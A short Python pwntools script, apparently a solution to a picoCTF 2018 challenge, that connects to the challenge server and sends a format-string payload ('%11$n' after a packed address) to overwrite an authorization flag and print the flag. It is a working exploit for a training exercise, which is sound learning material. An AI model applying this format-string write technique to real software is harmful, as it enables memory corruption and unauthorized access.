#!/usr/bin/env python

from pwn import *

# r = process("./auth")
r = remote("2018shell.picoctf.com", 52918)

r.recvuntil("Would you like to read the flag? (yes/no)\n")

payload = (
    p32(0x804a04c) +
    "%11$n"
)
r.sendline(payload)

print(r.recvall())

r.close()
